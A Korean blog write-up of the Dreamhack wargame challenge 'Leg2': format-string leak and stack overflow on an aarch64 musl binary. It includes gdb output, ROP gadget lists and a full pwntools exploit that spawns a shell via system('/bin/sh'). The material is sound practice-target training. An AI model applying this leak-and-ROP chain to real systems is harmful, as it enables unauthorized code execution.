---
title: "[DREAMHACK] Leg2 writeup"
date: 2026-03-15 19:29:00
categories: Essay
tags: [writeup]
---

# [DREAMHACK] Leg2

**포맷 스트링 강의**를 들으며 복습했다.  
드림핵에서 마침 해당 태그에서 한 문제만 더 풀면  
포맷스트링 짱짱해커가 되기 때문에 풀기로 했다.  

개인적으로는 이걸 풀고 다른 여러가지 잡기술도 알아볼 예정이다.

환경 자체는 `tmux`로 화면 나눈 뒤,  
한 쪽엔 `run.sh` 실행시키고  
반대쪽엔 `8000` 포트로 연결한 창을 두었다.  
나 쫌 짱짱해커일지도.

![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/ba08e3423b04acd08926cacad76fd8fa1af487f538c78fefe9f930c80e620fc4.png)


---
<!--more-->

# Background
`Aarch x64 Stack layout` 부터 알아보겠다.  
알아가는 김에, **레지스터의 종류** 또한 같이 볼 거다.  

내가 이걸 작성하면 얻고 싶은게 좀 많거든 ㅋ  

**프롤로그 및 에필로그**

### 프롤로그
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/9851f74488e2225adfb22c29b3f66555decff6a9911a7973526b9281ccbe2119.png)

`stp`, 한 쌍의 레지스터의 값을 `sp`에서  
`#local_10`만큼 뺀 위치에 저장한다.  
분석하면서 안 건데, 
```
Stack[-0x10]:8 local_10
```
위와 같은 식의 부분은 오프셋을 의미한다.  
즉 `stp x29, x30 [sp, #local_10]!`  
이건 `stp x29, x39 [sp, #-0x10]!` 라는 의미다.

이 표기법, 그리고 `post indexing`, `pre indexing`에서 좀 애를 먹었다.  
하나만 이해하고 전체를 보려 하다가 막혀서 알게 되었다.  

방이 참 시끄러워서 집중이 안된다. 자습실은 내려오기 귀찮은데.  

### 에필로그
설명을 너무 길게 하면 의미가 없으니 배웠던 점을 빠르게 정리하겠다.  
```asm
stp x29, x30, [sp, #0x10]! << sp-=0x10, sp=x29, sp-0x8=x30
mov x29, sp << x29 = sp, 프레임 구분
...
ldp x29, x30, [sp], #0x10 << x29 = sp, x30 = sp+0x8
ret
```

`x30` 덮는 건 `buf` 덮고, `x29`만 덮으면 될 일이다.  
적어도 이번엔 카나리가 없었으니 말이다.  

`arm64` 카나리 붙인 것도 풀어볼 예정이다. 그렇게 어렵진 않겠지?  

---
# 정적 분석

## checksec & 파일 정보

**`./chal`**
```bash
    Arch:       aarch64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
딱봐도 평범한 `BOF` 문제죠?

```bash
file chal 
chal: ELF 64-bit LSB pie executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-aarch64.so.1, not stripped
```

**`./rootfs`** & **`./kernel`**
```bash
file rootfs 
rootfs: gzip compressed data, max compression, from Unix, original size modulo 2^32 10017280
```
```bash
file kernel 
kernel: Linux kernel ARM64 boot executable Image, little-endian, 4K pages
```

## main
구조 자체는 간단해 보이는군.
```c
int main(void)

{
  proc_init();
  vuln();
  return 0;
}
```

## proc_init
`proc_init`은 정석적인 워게임 설정이다.
```c
void proc_init(void)

{
  setvbuf(_stdin,(char *)0x0,2,0);
  setvbuf(_stdout,(char *)0x0,2,0);
  setvbuf(_stderr,(char *)0x0,2,0);
  name = &name_pointer;
  return;
}
```

## vuln
```c
void vuln(void)

{
  char auStack_100 [256];
  
  printf("your name > ");
  read_input(&name_pointer,0x20);
  printf("Hi! ");
  printf(&name_pointer);
  putchar(10);
  printf("Let me know your message!");
  printf("\n> ");
  read_input(auStack_100,0x200);
  return;
}
```

`vuln`에서는 여느 워게임과 같이 `printf()` 패턴이 확인 가능하다.  
두 번째 `printf`에서 `FSB`가 가능한 구조다.  
엄.. 그리고 읽는 값도 `0x200`으로, 확실히 크다. 엄청 크진 않지만  
적당한 정도라고 할까..

## read_input
```c
ulong read_input(void *param_1,int param_2)

{
  int iVar1;
  ulong uVar2;
  
  uVar2 = read(0,param_1,(long)param_2);
  iVar1 = (int)uVar2;
  if (iVar1 < 0) {
    fwrite("read error!\n",1,0xc,_stderr);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (*(char *)((long)param_1 + (long)iVar1 + -1) == '\n') {
    *(undefined1 *)((long)param_1 + (long)iVar1 + -1) = 0;
  }
  return uVar2 & 0xffffffff;
}
```

`read_input`은 `read()`를 내부에서 다시 호출한다.  
오류 처리도 나름대로 되어있고,  
마지막 문자가 `0xa`, 개행문자인 경우  
널 바이트로 종결시켜준다.  

그리고 읽은 값을 가져와 `0xffffffff`과 **&**연산을 한다.  

가장 먼저 알아야 할 점은 내가 `ARM exploit`을 해본 적이 없다.  
정확히 말하자면  
드림핵에서 알려준 기초적인 `ARM` 익스 부분을 두 번 정도밖에는 쓴 적이 없다.  

그래서 이번 문제는 `Aarch x64`에서의 `Stack layout`,  
그리고 `ROP` 부분에 대해 많이 배울 수 있는 기회였다.  

적당한 `ROP Gadget`을 찾을 건데, `libc.so`를 가져와야 한다.  
...**rootfs**를 열어본 뒤 `/lib`에 있는 `libc.so`를 가져오면 된다.  

## rootfs에서 libc.so 추출

### 1. 일단 열기
`binwalk -e ./rootfs`  

```bash
>> ls
0  0.gz  <--- 이거 0.gz가 풀린 게 0임. 이 친구 cpio로 열어주면 됨
```
```bash
cat 0 | cpio -idm
```

### 2. 일단 꺼내기
`_rootfs.extracted/` 라는 폴더 내에 아래와 같은 내용이 있음.  
여기에서 `lib/`로 이동한 뒤,  

```bash
ld-musl-aarch64.so.1  libatomic.so.1      libc.so      libgcc_s.so.1
libatomic.so          libatomic.so.1.2.0  libgcc_s.so  modules
```
위와 같이 확인 후 꺼내 쓰면 됨.  

---

# 동적 분석

## 환경
`./run.sh`로 `qemu-system-aarch64`를 돌렸다.  
`nc localhost 8000`으로 접속했다.  

`qemu`내에선 `/usr/bin/chal`에 바이너리가 있는 걸 확인할 수 있다.  
아, `binwalk`로 버전때문에 열리지 않았는데, 중간에 그 오류가  
```bash
binwalk -e ./rootfs
Traceback (most recent call last):
  File "/usr/bin/binwalk", line 2, in <module>
    from binwalk.__main__ import main
  File "/usr/lib/python3/dist-packages/binwalk/__main__.py", line 24, in <module>
    import binwalk.modules
  File "/usr/lib/python3/dist-packages/binwalk/modules/__init__.py", line 3, in <module>
    from binwalk.modules.disasm import Disasm
  File "/usr/lib/python3/dist-packages/binwalk/modules/disasm.py", line 21, in <module>
    class Disasm(Module):
  File "/usr/lib/python3/dist-packages/binwalk/modules/disasm.py", line 60, in Disasm
    Architecture(type=capstone.CS_ARCH_AARCH64,
AttributeError: module 'capstone' has no attribute 'CS_ARCH_AARCH64'. Did you mean: 'CS_ARCH_ARM64'?
```

이거였다. 이 친구는  
`sudo sed -i 's/CS_ARCH_AARCH64/CS_ARCH_ARM64/g' /usr/lib/python3/dist-packages/binwalk/modules/disasm.py`

이걸로 해결할 수 있다.  
검색하디 레딧에 계시던 분이 편하게 명령어를 바로 알려주셨다.

## FSB로 값 뽑아보기
```bash
nc localhost 8000
your name > AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Hi! AAAA0xfffff49b7fa0.0x2.0xffff90398f4c.0xfffff49b7f54.0xfffffffffffffff0.0.0xaaaacc22bc90.0xfffff49b8260.0xaaaacc22bc54.
Let me know your message!
> ^C
```

이쪽 경험이 없으니 어디가 `lib`가 매핑된 쪽 주소인지 모르겠다.  
이미 준비된 `gdb`(문제 파일에 포함되어있는 kernel 이미지 내)  

세 번째 `printf`에 중단점을 설정한다.  
그리고 방금 보낸 페이로드를 보낸 뒤 매핑된 주소와 비교해보겠다.
```bash
(gdb) disass vuln
Dump of assembler code for function vuln:
   0x0000aaaaaaaaabd0 <+0>:	stp	x29, x30, [sp, #-272]!
   0x0000aaaaaaaaabd4 <+4>:	mov	x29, sp
   0x0000aaaaaaaaabd8 <+8>:	adrp	x0, 0xaaaaaaaaa000
   0x0000aaaaaaaaabdc <+12>:	add	x0, x0, #0xc80
   0x0000aaaaaaaaabe0 <+16>:	bl	0xaaaaaaaaa860 <printf@plt>
   0x0000aaaaaaaaabe4 <+20>:	mov	w1, #0x20                  	// #32
   0x0000aaaaaaaaabe8 <+24>:	adrp	x0, 0xaaaaaaabc000
   0x0000aaaaaaaaabec <+28>:	add	x0, x0, #0x40
   0x0000aaaaaaaaabf0 <+32>:	bl	0xaaaaaaaaaac4 <read_input>
   0x0000aaaaaaaaabf4 <+36>:	adrp	x0, 0xaaaaaaaaa000
   0x0000aaaaaaaaabf8 <+40>:	add	x0, x0, #0xc90
   0x0000aaaaaaaaabfc <+44>:	bl	0xaaaaaaaaa860 <printf@plt>
=> 0x0000aaaaaaaaac00 <+48>:	adrp	x0, 0xaaaaaaabc000
   0x0000aaaaaaaaac04 <+52>:	add	x0, x0, #0x40
   0x0000aaaaaaaaac08 <+56>:	bl	0xaaaaaaaaa860 <printf@plt>
   0x0000aaaaaaaaac0c <+60>:	mov	w0, #0xa                   	// #10
   0x0000aaaaaaaaac10 <+64>:	bl	0xaaaaaaaaa850 <putchar@plt>
   0x0000aaaaaaaaac14 <+68>:	adrp	x0, 0xaaaaaaaaa000
   0x0000aaaaaaaaac18 <+72>:	add	x0, x0, #0xc98
   0x0000aaaaaaaaac1c <+76>:	bl	0xaaaaaaaaa860 <printf@plt>
   0x0000aaaaaaaaac20 <+80>:	adrp	x0, 0xaaaaaaaaa000
   0x0000aaaaaaaaac24 <+84>:	add	x0, x0, #0xcb8
---Type <return> to continue, or q <return> to quit---
   0x0000aaaaaaaaac28 <+88>:	bl	0xaaaaaaaaa860 <printf@plt>
   0x0000aaaaaaaaac2c <+92>:	add	x0, sp, #0x10
   0x0000aaaaaaaaac30 <+96>:	mov	w1, #0x200                 	// #512
   0x0000aaaaaaaaac34 <+100>:	bl	0xaaaaaaaaaac4 <read_input>
   0x0000aaaaaaaaac38 <+104>:	nop
   0x0000aaaaaaaaac3c <+108>:	ldp	x29, x30, [sp], #272
   0x0000aaaaaaaaac40 <+112>:	ret
End of assembler dump.

(gdb) b *vuln+60
Breakpoint 3 at 0xaaaaaaaaac0c
```

..그나저나 페이로드에 `AAAA` 넣는 건 습관이다. `x86_64`에서 하던 버릇이 남아있다고 보면 된다.

```bash
Hi! 0xfffffffffa40.0x2.0xfffff7f9df4c.0xfffffffff9f4.0xfffffffffffffff0.0.0xaaaaaaaaac90.0xfffffffffd00.0xaaaaaaaaac54.0x1fb03ffe
Breakpoint 3, 0x0000aaaaaaaaac0c in vuln ()
(gdb) info proc map
process 219
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0xaaaaaaaaa000     0xaaaaaaaab000     0x1000        0x0 /usr/bin/chal
      0xaaaaaaabb000     0xaaaaaaabc000     0x1000     0x1000 /usr/bin/chal
      0xaaaaaaabc000     0xaaaaaaabd000     0x1000     0x2000 /usr/bin/chal
      0xfffff7f57000     0xfffff7feb000    0x94000        0x0 /lib/libc.so
      0xfffff7ff9000     0xfffff7ffa000     0x1000        0x0 [vvar]
      0xfffff7ffa000     0xfffff7ffb000     0x1000        0x0 [vdso]
      0xfffff7ffb000     0xfffff7ffd000     0x2000    0x94000 /lib/libc.so
      0xfffff7ffd000     0xfffff8000000     0x3000        0x0 
      0xfffffffdf000    0x1000000000000    0x21000        0x0 [stack]
(gdb) 
```

확인해본 결과, 0xff...7f...인 것 같다.  
`PIE` 쪽도 구할 수 있는데, 쓸만한 가젯은 `libc_base`를 찾을 수 있는 상황에서  
상대적으로 가젯이 부족한 바이너리 내부를 기준으로 구할 필요는 적다고 생각했다.  

두 번째 `read_input()` 때 상당히 크게 입력을 받으므로 가젯의 크기는 크게 고려하지 않아도 될 것 같다.  

`read_input(auStack_100,0x200);` <<

가젯은 다음과 같이 찾을 수 있다:  
```
ROPgadget --binary libc.so --depth 5 | grep "ldr x0" | grep "x30"
...
0x000000000003c100 : bl #0x3c194 ; ldr x0, [sp, #0x18] ; ldp x19, x30, [sp], #0x30 ; ret
0x000000000003ba8c : bl #0x3c194 ; ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x30 ; ret
0x000000000003cb1c : bl #0x3c668 ; ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x20 ; ret
0x000000000003cae4 : bl #0x3cb60 ; ldr x0, [sp, #0x18] ; ldp x19, x30, [sp], #0x20 ; ret
0x000000000003babc : bl #0x3cb60 ; ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x20 ; ret
0x000000000004508c : bl #0x44f84 ; ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x20 ; ret
0x0000000000021fc8 : cmp w0, #0x3b ; ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x30 ; csinv x0, x0, xzr, eq ; ret
0x000000000001f44c : cmp w19, #2 ; b.hi #0x1f458 ; ldr x0, [sp, #0x18] ; ldp x19, x30, [sp], #0x60 ; ret
0x00000000000349d4 : cmp x0, #0 ; ldr x0, [sp, #0x10] ; ldr x30, [sp], #0x20 ; csel x0, x0, xzr, ge ; ret
0x0000000000059554 : cmp x0, #0 ; ldr x0, [sp, #0x40] ; ldr x30, [sp], #0x50 ; cinc w0, w0, ne ; ret
0x000000000001b150 : ldp x19, x20, [sp], #0x30 ; b #0x52708 ; ldr x0, [x0] ; ret
0x0000000000058d40 : ldr x0, [sp, #0x10] ; cbz x19, #0x58d4c ; str x0, [x19] ; ldp x19, x30, [sp], #0x20 ; ret
0x00000000000349d8 : ldr x0, [sp, #0x10] ; ldr x30, [sp], #0x20 ; csel x0, x0, xzr, ge ; ret
0x000000000002e7ac : ldr x0, [sp, #0x18] ; bl #0x2d89c ; bl #0x61474 ; ldr x30, [sp], #0x20 ; ret
0x000000000003cae8 : ldr x0, [sp, #0x18] ; ldp x19, x30, [sp], #0x20 ; ret
0x000000000003c104 : ldr x0, [sp, #0x18] ; ldp x19, x30, [sp], #0x30 ; ret
0x000000000001f454 : ldr x0, [sp, #0x18] ; ldp x19, x30, [sp], #0x60 ; ret
0x000000000003bac0 : ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x20 ; ret
0x0000000000021fcc : ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x30 ; csinv x0, x0, xzr, eq ; ret
0x000000000003ba90 : ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x30 ; ret
0x0000000000056578 : ldr x0, [sp, #0x18] ; str w0, [x19] ; mov w0, #0 ; ldp x19, x30, [sp], #0x20 ; ret
0x0000000000045ef0 : ldr x0, [sp, #0x20] ; ldr x30, [sp, #0x10] ; csinv x0, x0, xzr, ge ; ldp x19, x20, [sp], #0x150 ; ret
0x000000000003cd58 : ldr x0, [sp, #0x38] ; ldp x21, x22, [sp, #0x10] ; ldr x30, [sp, #0x20] ; ldp x19, x20, [sp], #0x40 ; ret
0x0000000000059558 : ldr x0, [sp, #0x40] ; ldr x30, [sp], #0x50 ; cinc w0, w0, ne ; ret
0x000000000004684c : ldr x0, [sp, #0x58] ; str x0, [x19, #0x50] ; mov w0, #0 ; ldp x19, x30, [sp], #0x90 ; ret
0x0000000000044f64 : ldr x0, [x19] ; bl #0x14270 ; str xzr, [x19] ; ldp x19, x30, [sp], #0x10 ; ret
0x0000000000038484 : ldr x30, [sp], #0x10 ; ret ; adrp x0, #0xa4000 ; ldr x0, [x0, #0xfa0] ; ret
0x000000000003cb18 : mov x0, #0 ; bl #0x3c668 ; ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x20 ; ret
0x000000000001b14c : mov x0, x20 ; ldp x19, x20, [sp], #0x30 ; b #0x52708 ; ldr x0, [x0] ; ret
0x000000000001e180 : mov x2, x30 ; b #0x5dc8c ; ldr x0, [x0, #8] ; ret
...
```

이 가젯을 어떻게 찾을 수 있었을까..  
스토리를 풀어보자면 이렇다.  

궁금할 리가 없지만 들어봐라,  

`x86_64`에선 `pop rdi` <- `binsh`  
그 뒤에 `system`을 붙였다.  

`arm64` 쪽은 스택에 이와 유사하게 값을 쌓아 이용하는 느낌이 아니었다.  
그래서 `x30`과 인자 `x0`(첫번째)는 순서와 상관없이 값만 제대로 지정할 수 있으면 된다.  

`ldr` 두 번 쓰는 것만 있으며 될 듯?? > ldr x0, ldr x30 grep으로 걸러냄  

적당히 `sp` 전까지 채우고, `sp~sp+0x7`, `sp+0x8~sp+0xf`까지 읽게 하면 된다.  
그래서 사용한 가젯이  
`0x000000000003bac0 : ldr x0, [sp, #0x18] ; ldr x30, [sp], #0x20 ; ret`  
이거다.

이 과정에 생각보다 많은 시간이 할애되었다.  
그래서 적지 않을 거다.  
부끄러움을 아는 사내, 그것이 나다.  

---
# Exploit

익스코드에는 필요한 가젯을 이외에도 첨부했다.  
적당히 조건을 맞춰 사용하면 될 듯 하다.  
```py
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./chal')
#context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

HOST, PORT = "host3.dreamhack.games 14005".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

# 필자는 환경 설정을 따로 하지 않음,
# 아주낮은확률로혹시나사용할경우알아서맞춰사용하게.
# 친절한사내.그것이나다.
if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so')
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"})
    libc = ELF('./libc.so')

ru(b'your name > ')
sl(b'%p %p %p')
ru(b'Hi! ')
leak = int(rl().split()[-1], 16)
slog("leak", leak)

lb = leak - 0x46f4c
slog('libc_base', lb)
libc.address = lb

system = libc.sym["system"]
binsh = next(libc.search(b'/bin/sh\x00'))

slog("system", system)
slog("/bin/sh", binsh)

gs = [0x3cae8, 0x349d8, 0x3c104, 0x3ba90, 0x3bac0]
gadget = lb + gs[4]
slog('gadget', gadget)

pay = b'A'*0x100 + b'B'*0x8 + p64(gadget)
pay += p64(system)
pay += p64(0) * 2
pay += p64(binsh)

sla(b'> ', pay)

p.interactive()
```

---
+PS)
다른 롸업 정리하다 이거 쓰는 걸 잊어버렸다.  
그나저나 기능 3과제 쉬운듯 ㅋ.  
이렇듯 쉬운 건 제쳐두고 할 일을 하는 사내.  
그것이 나다.